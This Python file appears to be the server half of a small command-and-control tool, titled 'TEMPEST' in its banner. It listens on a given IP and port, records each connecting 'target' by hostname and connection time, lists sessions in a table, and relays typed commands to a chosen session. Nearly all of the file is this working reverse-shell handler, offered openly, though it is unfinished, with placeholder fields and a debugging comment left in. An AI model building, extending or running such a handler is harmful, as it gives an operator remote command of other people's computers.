from prettytable import PrettyTable
from datetime import datetime

import socket
import sys
import threading
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    """ Prints an ASCII art title banner. Intended to use when starting the server.
    """
    print(bcolors.HEADER + '=============================================' + bcolors.ENDC)
    print(bcolors.HEADER + ' _____  _____ _      ____  _____ ____  _____ ' + bcolors.ENDC)
    print(bcolors.HEADER + '/__ __\/  __// \__/|/  __\/  __// ___\/__ __\\' + bcolors.ENDC)
    print(bcolors.HEADER + '  / \  |  \  | |\/|||  \/||  \  |    \  / \  ' + bcolors.ENDC)
    print(bcolors.HEADER + '  | |  |  /_ | |  |||  __/|  /_ \___ |  | |  ' + bcolors.ENDC)
    print(bcolors.HEADER + '  \_/  \____\\\\_/  \|\_/   \____\\\\____/  \_/  ' + bcolors.ENDC)
    print(bcolors.HEADER + bcolors.BOLD + '\nBy HK Transfield' + bcolors.ENDC)
    print(bcolors.HEADER + '=============================================\n' + bcolors.ENDC)

def comm_in(target_id):
    """Handles all responses sent from a sockclient.

    Args:
        target_id (int): _description_

    Returns:
        string: _description_
    """
    print('[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response

def comm_out(target_id, message):
    """Sends commands from the sockserver to a sockclient.

    Args:
        target_id (int): _description_
        message (string): _description_
    """
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id):
    """
    Manages the command and traffic control.
    """
    while True:
        message = input('[*] Message to send > ')
        comm_out(target_id, message)
        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            break
        if message == 'background':
            break

        else:
            response = comm_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                target_id.close()
                break
            print(response)

def listener_handler():
    """ Hosts the listener for the socket, binds the socket, accepts
    traffic, and then redirects that traffic.
    """

    # 1 Accept Connection
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target = comm_handler)
    t1.start()

def comm_handler():
    """ Directs traffic to where it needs to go and ensures that it is
    receiving it where needed.
    """
    while True:
        # ! WHY IS THIS NOT WORKING?
        if kill_flag == 1:
            print('OHHHH NOOOOO')
            break
        try:
            remote_target, remote_ip = sock.accept()

            # get the time when the target client connects
            curr_time = time.strftime("%H:%M:%S", time.localtime())
            curr_date = datetime.now()
            time_record = (f"{curr_date.day}-{curr_date.month}-{curr_date.year} {curr_time}")

            # get the host name of the target client
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
                print(bcolors.OKGREEN + f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')


        except:
            pass

if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again')
        print('[-] Usage: python sockserver.py [host IP] [host Port]')
    except Exception as e:
        print(e)
    listener_handler()

    while True:
        try:
            command = input('[*] Enter command > ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0

                # list sessions
                if command.split(" ")[1] == '-l':
                    print("")
                    sessions_table = PrettyTable()
                    sessions_table.field_names = [
                        bcolors.OKCYAN + bcolors.BOLD + 'Session' + bcolors.ENDC,
                        bcolors.OKCYAN + bcolors.BOLD + 'Status' + bcolors.ENDC,
                        bcolors.OKCYAN + bcolors.BOLD + 'Username' + bcolors.ENDC,
                        bcolors.OKCYAN + bcolors.BOLD + 'Target' + bcolors.ENDC,
                        bcolors.OKCYAN + bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                    ]

                    sessions_table.padding_width = 3

                    for target in targets:
                        sessions_table.add_row([session_counter, 'placeholder', 'placeholder', target[1], target[2]])
                        session_counter += 1
                    print(sessions_table)
                    print("")

                # interact with individual sessions
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    target_id = (targets[num])[0]
                    target_comm(target_id)

        except KeyboardInterrupt:
            print(bcolors.WARNING + '\n[+] Keyboard interrupt issued.' + bcolors.ENDC)
            kill_flag = 1
            sock.close()
            break

